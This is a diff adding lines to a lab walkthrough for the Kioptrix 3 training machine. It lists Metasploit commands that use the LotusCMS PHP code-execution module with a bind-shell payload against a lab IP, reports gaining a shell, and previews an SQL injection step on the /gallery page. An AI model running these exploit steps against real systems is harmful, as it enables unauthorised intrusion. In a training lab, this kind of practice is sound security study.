@@ -198,11 +198,36 @@ Step 7: Exploitation
 ***Setting up the options:***
 
 >msfconsole
+
 >search lotuscms
+
 >use exploit/multi/http/lcms_php_exec
+
 >show options
+
 >set RHOSTS 192.168.100.80
+
 >set LHOST 192.168.100.164
+
 >set PAYLOAD generic/shell_bind_tcp
+
 >set URI /
+
 >exploit
+
+![image](https://user-images.githubusercontent.com/31168741/199955556-e73a7f88-3608-4e8a-b6a2-c9b4d8b15bcf.png)
+
+We are into the shell!
+
+![image](https://user-images.githubusercontent.com/31168741/199955647-b1001ada-0fdf-4846-b31d-97b94aac37a8.png)
+
+But, the file we need to get into asks for the root permit and we don't have one. This would’ve worked in the past but it seems it doesn’t work anymore since this is a very old machine. So, we got only one way to get through i.e. by SQLi.
+
+Step 8:
+On another note, we find out, kioptrix3.com/gallery, let’s look into that!
+
+![1](https://user-images.githubusercontent.com/31168741/199956198-94b4f909-fe87-4d1c-80b9-3e46039317f3.PNG)
+
+![1](https://user-images.githubusercontent.com/31168741/199956287-5dbe1054-01a6-4e3d-926e-40ad9e16ba47.PNG)
+
+
